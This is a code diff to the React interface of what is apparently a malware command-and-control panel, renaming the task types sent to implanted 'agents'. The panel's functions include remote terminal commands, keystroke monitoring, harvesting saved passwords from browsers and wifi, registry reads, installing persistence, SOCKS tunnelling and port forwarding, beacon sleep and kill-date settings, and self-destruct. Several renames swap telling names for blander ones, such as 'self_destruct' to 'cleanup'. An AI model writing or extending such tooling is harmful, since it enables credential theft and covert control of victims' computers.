@@ -27,8 +27,8 @@ export default function AgentModal({ agent, onClose }) {
   }, [agent.id]);
 
   const sendCommand = async (cmd) => {
-    const res = await api.createTask(agent.id, 'terminal_session', { command: cmd });
-    setTasks(prev => [{ id: res.id, task_type: 'terminal_session', args_json: JSON.stringify({ command: cmd }), status: 'pending', created_at: new Date().toISOString() }, ...prev]);
+    const res = await api.createTask(agent.id, 'terminal', { command: cmd });
+    setTasks(prev => [{ id: res.id, task_type: 'terminal', args_json: JSON.stringify({ command: cmd }), status: 'pending', created_at: new Date().toISOString() }, ...prev]);
     return 'Task #' + res.id + ' queued';
   };
 
@@ -237,11 +237,11 @@ function InputLogTab({ agentId }) {
   const [logs, setLogs] = useState([]);
 
   const startMonitor = () => {
-    api.createTask(agentId, 'input_monitor', { action: 'start' });
+    api.createTask(agentId, 'input_monitor_start', {});
     setMonitoring(true);
   };
   const stopMonitor = () => {
-    api.createTask(agentId, 'input_monitor', { action: 'stop' });
+    api.createTask(agentId, 'input_monitor_stop', {});
     setMonitoring(false);
   };
 
@@ -273,7 +273,7 @@ function VaultTab({ creds, agentId }) {
   const filtered = filter === 'all' ? creds : creds.filter(c => c.source?.toLowerCase() === filter);
 
   const harvest = () => {
-    api.createTask(agentId, 'vault_read', { targets: ['chrome','firefox','edge','wifi','system'] });
+    api.createTask(agentId, 'vault_reader', { targets: ['chrome','firefox','edge','wifi','system'] });
   };
 
   const copyPw = (pw) => {
@@ -331,7 +331,7 @@ function ConfigStoreTab({ agentId }) {
   ];
 
   const refreshReg = () => {
-    api.createTask(agentId, 'config_read', { key: selectedKey });
+    api.createTask(agentId, 'config_store_read', { key: selectedKey });
   };
 
   const renderTree = (nodes, depth = 0) => nodes.map((n, i) => (
@@ -372,10 +372,10 @@ function ServicesTab({ agentId }) {
   const [services, setServices] = useState([]);
 
   const addPersistence = () => {
-    api.createTask(agentId, 'service_add', {});
+    api.createTask(agentId, 'service_manager_install', {});
   };
   const refresh = () => {
-    api.createTask(agentId, 'service_list', {});
+    api.createTask(agentId, 'boot_entries_list', {});
   };
 
   return (
@@ -413,10 +413,10 @@ function NetworkTab({ agentId }) {
   const [forwards, setForwards] = useState([]);
 
   const startTunnel = () => {
-    api.createTask(agentId, 'network_relay', { type: 'socks5', port: socksPort });
+    api.createTask(agentId, 'tunnel_start', { type: 'socks5', port: socksPort });
   };
   const addForward = () => {
-    api.createTask(agentId, 'network_relay', { type: 'portfwd', local: fwdLocal, remote: fwdRemote });
+    api.createTask(agentId, 'tunnel_start', { type: 'portfwd', local: fwdLocal, remote: fwdRemote });
   };
 
   return (
@@ -492,12 +492,12 @@ function AgentSettingsTab({ agentId, sleep, setSleep, jitter, setJitter }) {
   const [showUpdateDialog, setShowUpdateDialog] = useState(false);
 
   const updateConfig = () => {
-    api.createTask(agentId, 'config_update', { sleep, jitter, kill_date: killDate, work_start: workStart, work_end: workEnd });
+    api.createTask(agentId, 'config_store_write', { sleep, jitter, kill_date: killDate, work_start: workStart, work_end: workEnd });
   };
 
   const selfDestruct = () => {
     if (confirm('CONFIRM SELF DESTRUCT? This will terminate the agent and remove all persistence.')) {
-      api.createTask(agentId, 'self_destruct', {});
+      api.createTask(agentId, 'cleanup', {});
     }
   };
 
